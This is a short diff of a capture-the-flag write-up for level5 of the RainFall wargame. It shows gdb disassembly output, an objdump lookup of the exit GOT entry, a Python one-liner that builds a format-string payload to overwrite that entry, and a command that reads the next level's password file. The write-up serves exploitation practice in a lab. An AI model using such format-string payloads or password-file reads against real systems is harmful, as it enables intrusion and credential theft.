@@ -83,7 +83,8 @@ Dump of assembler code for function o:
    0x080484b6 <+18>:	movl   $0x1,(%esp)
    0x080484bd <+25>:	call   0x8048390 <_exit@plt>
 End of assembler dump.
-(gdb) q
+(gdb) 
+level5@RainFall:~$ objdump -R level5 | grep exit
 level5@RainFall:~$ python -c "print '\x08\x04\x98\x38'[::-1] + '%134513824d' + '%4\$n'" > /tmp/inj5
 level5@RainFall:~$ cat /tmp/inj5 - | ./level5 | tr -d " "
 cat /home/user/level6/.pass
